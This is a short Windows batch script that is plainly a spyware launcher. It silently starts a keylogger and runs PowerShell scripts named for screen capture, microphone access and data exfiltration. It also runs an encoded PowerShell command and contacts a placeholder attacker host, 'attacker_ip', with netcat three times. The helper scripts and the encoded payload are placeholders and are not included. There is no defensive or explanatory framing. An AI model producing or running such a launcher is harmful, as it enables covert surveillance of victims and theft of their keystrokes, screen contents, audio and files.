@echo off
start /b keylogger.exe
powershell.exe -File screen_capture.ps1
powershell.exe -File microphone_access.ps1
powershell.exe -File data_exfiltration.ps1
powershell.exe -EncodedCommand "base64_encoded_shell_script"
nc.exe -zv attacker_ip 443
nc.exe -zv attacker_ip 443
nc.exe -zv attacker_ip 443
